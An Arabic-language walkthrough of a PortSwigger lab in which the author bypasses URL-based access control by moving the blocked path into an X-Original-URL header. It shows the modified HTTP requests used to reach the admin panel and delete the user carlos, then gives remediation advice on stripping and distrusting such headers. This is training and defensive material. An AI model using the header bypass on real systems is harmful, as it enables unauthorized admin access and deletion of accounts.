# [URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

## **`الهدف`**
الدخول إلى لوحة تحكم الإدارة وحذف المُستخدم `carlos.`
## **`خطوات الحل`**
نقوم بالدخول على `Admin panel` لنجد رسالة `Access denied` لذلك نقوم بعمل اعتراض لـ `request` الدخول إلى الـ `Admin panel` ونرسلها إلى الـ `repeater` 
لكي نستطيع التعديل لأنه عند محاولة التعديل فى الـ `Intercept` لم أستطع النزول إلى سطر جديد، لذلك نعدل فى الـ `repeater` وننسخ الناتج ونضعه في الـ `Intercept`
```http
GET /admin HTTP/2
Host: 0a6f009704a8bdbc82676b02004a0083.web-security-academy.net
Cookie: session=ljcYQRCT0OBDKVrR8ZASHPCHplMnaGsU
```

ونقوم بحذف الـ `/admin` من اول سطر ونقوم بإضافة `X-Original-Url: /admin `من بين الـ `Host` والـ `Cookie` ونقوم بتمرير الـ `request`
```http
GET /HTTP/2 HTTP/2
Host: 0a6f009704a8bdbc82676b02004a0083.web-security-academy.net
X-Original-Url: /admin
Cookie: session=ljcYQRCT0OBDKVrR8ZASHPCHplMnaGsU
```

بعد الدخول إلى لوحة التحكم، نقوم بالضغط على `delete` بجانب اسم `carlos` فنجد رسالة `Access denied` مرة أخرى لذلك نحتاج إلى أن نعترض الـ `request` حذف الحساب 
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a6f009704a8bdbc82676b02004a0083.web-security-academy.net
Cookie: session=ljcYQRCT0OBDKVrR8ZASHPCHplMnaGsU
```

ونقوم بتكرار الخطوة السابقة ونعدله إلى 
```http
GET ?username=carlos HTTP/2
Host: 0a6f009704a8bdbc82676b02004a0083.web-security-academy.net
X-Original-URL: /admin/delete
Cookie: session=ljcYQRCT0OBDKVrR8ZASHPCHplMnaGsU
```

ولكن يجب أن يُترك الجزء الخاص بـ `?username=carlos` في أول سطر ليمر الـ `request` بنجاح ويتم حذف حساب `carlos` والانتهاء من حل اللاب.
## **`ترقيع الثغرة`**
يجب على السيرفر الخلفى أو الـ `Framework` الذي يعمل به الموقع أن يقوم بتعطيل الـ `Headers` الغير قياسية تمامًا بحيث يتجاهلها السيرفر ولا ينظر إليها كبديل للمسار الأصلى `URL` ، ويجب إعداد السيرفر الأمامي `(WAF=Web Application Firewall)` بحيث يقوم بحذف `Header` التوجيه المُحددة الذي يرسلها المُستخدم الخارجي مثل (`X-Original-URL` و `X-Rewrite-URL` قبل تمرير الـ `request` إلى السيرفر الخلفي، ويجب توحيد آلية قراءة المسار في نظام الحماية المسئول عن الـ `Access Control` وفي السيرفر الخلفي.

ويجب التوقف عن الاعتماد على الـ `Headers` في تحديد صلاحيات الوصول.

ويجب حصر الثقة في الشبكة الداخلية فقط، يجب على السيرفر أن يتم برمجته ألا يثق في الـ `Header` الغير قياسي إلا إذا كان قادمًا من `IP` الـ `Proxy` الداخلى الموثوق فقط، أو استعمال طرق أكثر موثوقية مثل إضافة توقيع سري ومشفر `(Internal Secret Token)` بين الـ `Proxy` والسيرفر الخلفي. وإعداد السيرفر الخلفي على ألا يثق في الـ `request` الذي يحتوى على `Header` غير قياسي إلا إذا احتوى على هذا التوقيع السري.
